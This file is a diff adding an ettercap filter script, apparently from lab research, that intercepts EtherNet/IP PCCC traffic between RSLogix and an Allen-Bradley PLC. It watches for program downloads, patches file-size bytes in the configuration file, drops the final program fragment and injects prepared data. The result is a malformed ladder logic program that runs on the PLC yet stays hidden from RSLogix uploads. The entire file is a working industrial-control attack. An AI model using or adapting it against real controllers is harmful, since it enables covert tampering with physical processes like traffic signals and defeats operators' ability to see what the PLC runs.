@@ -1,0 +1,95 @@
+################################################
+#                                              #   
+#        Modify packets: RSLogix -> PLC        #
+#                                              #
+################################################
+
+# Inject Mal-formed program which can be run in PLC but can't be viewed in RSLogix when RSLogix upload program.
+
+# Inject malformed ladder logic program for traffic_light_change_time.rss
+
+if (ip.proto == TCP && tcp.dst == 44818) {
+    if (DATA.pccc == "\x0f"){
+#        msg("Command Packet");
+        if (DATA.pccc+4 == "\x80" && DATA.pccc+5 == "\x01"){
+            msg("The PLC is entering Programing Mode");
+        }
+        if (DATA.pccc+4 == "\x80" && DATA.pccc+5 == "\x06"){
+            msg("The PLC is entering back to RUN Mode");
+        }
+        if (DATA.pccc+4 == "\xaa"){     # File downloading
+#            msg("The PLC is downloading files");
+
+
+ #           if (DATA.pccc+6 == "\x03" && DATA.pccc+7 == "\x85"){ # Unknown file that is downloaded right before Time file
+ #               msg("File type 85 is downloading");
+ #               log(DATA.data, "/home/hyunguk/etterfilter/just_before_pkt");
+ #               exec("/home/hyunguk/etterfilter/pccc_data_modifier");
+ #           }
+
+            if (DATA.pccc+6 == "\x00" && DATA.pccc+7 == "\x03"){ # Configuration file
+                msg("File type 03 - configuration file is downloading");
+                # change file size of timer file
+                # DATA.pccc+37 = "\x1c";
+
+                # change file size of ladder logic program 
+                if (DATA.pccc+66 == "\x9c"){     
+                    msg("Find the location of ladder logic program size in conf. file");
+                    DATA.pccc+52 = "\xde";
+                    DATA.pccc+53 = "\x9c"; 
+
+                    DATA.pccc+66 = "\xb2";      
+
+                    DATA.pccc+72 = "\xd2";
+                    DATA.pccc+73 = "\x54";
+                }
+
+                if (DATA.pccc+62 == "\x59" && DATA.pccc+63 == "\xcd"){
+                    DATA.pccc+62 = "\x2b";
+                    DATA.pccc+63 = "\x7f";
+                }
+            }
+
+#            if (DATA.pccc+6 == "\x00" && DATA.pccc+7 == "\x24"){
+#                msg("File type 24 - unknown");
+#                DATA.pccc+26 = "\x62";
+#                DATA.pccc+27 = "\x54";
+                
+#                DATA.pccc+30 = "\x9e";
+#                DATA.pccc+31 = "\xb1";
+#            }
+
+
+# generate injection data at the right before the attack. otherwise, tcp retransmission caused by RSlogix machine (due to delay occured in generating injection data) make ettercap inject twice. So, I need to seperate the generation step and the injection step. (ettercap need to fixed this problem)
+#            if (DATA.pccc+7 == "\x24"){ # Unknown file that is downloaded right before PLC program
+#                msg("File type 40 (just before type 22) is downloading");
+#                log(DATA.data, "/home/hyunguk/etterfilter/just_before_pkt");
+#                exec("/home/hyunguk/etterfilter/pccc_data_modifier");
+#            }
+
+            if (DATA.pccc+7 == "\x22"){    # PLC Program
+                if (DATA.pccc+9 == "\xa0"){     # Second fragment of program to last
+                    msg("Second fragment to last");
+                    log(DATA.data, "/home/hyunguk/etterfilter/just_before_pkt");
+                    exec("/home/hyunguk/etterfilter/pccc_data_modifier");
+                }
+                if (DATA.pccc+9 == "\xc8"){  # The last fragment of program
+                    msg("Last fragment");
+#                    log(DATA.data, "/home/hyunguk/etterfilter/template");
+                    drop();
+                    inject("/home/hyunguk/etterfilter/inject_data");
+                    exit();
+                }
+#                if (DATA.pccc+12 == "\x8d" && DATA.pccc+13 == "\x9a"){  # byte values in ladder logic program for traffic_light.rss
+#                    msg("Detect Ladder logic program downloading");
+#                    log(DATA.data, "/home/hyunguk/etterfilter/template");
+#                    exec("/home/hyunguk/etterfilter/pccc_data_modifier");
+
+#                    drop();
+#                    inject("/home/hyunguk/etterfilter/inject_data");
+#                    exit();
+#                }
+            }
+        }
+    }
+}
